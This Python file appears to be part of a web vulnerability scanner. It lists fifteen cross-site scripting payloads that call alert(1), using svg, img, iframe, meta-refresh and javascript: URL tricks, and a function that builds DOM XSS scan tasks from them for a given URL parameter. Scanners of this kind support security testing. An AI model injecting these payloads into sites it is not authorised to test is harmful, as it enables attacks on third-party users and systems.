PAYLOADS = [
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "'><script>alert(1)</script>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)></video>",
    "<math><mi>x</mi><script>alert(1)</script></math>",
    "<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>",
    "'><img src=x onerror=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
    "<object data=javascript:alert(1)>",
]

DEFAULT_PARAM = 'q'

def generate_tasks(url, config):
    tasks = []
    param = config.get('xss_param', DEFAULT_PARAM)
    limit = min(len(PAYLOADS), config.get('payloads', {}).get('xss', len(PAYLOADS)))
    for payload in PAYLOADS[:limit]:
        tasks.append({
            'url': url,
            'param': param,
            'payload': payload,
            'type': 'DOM XSS',
            'browser': True,
        })
    return tasks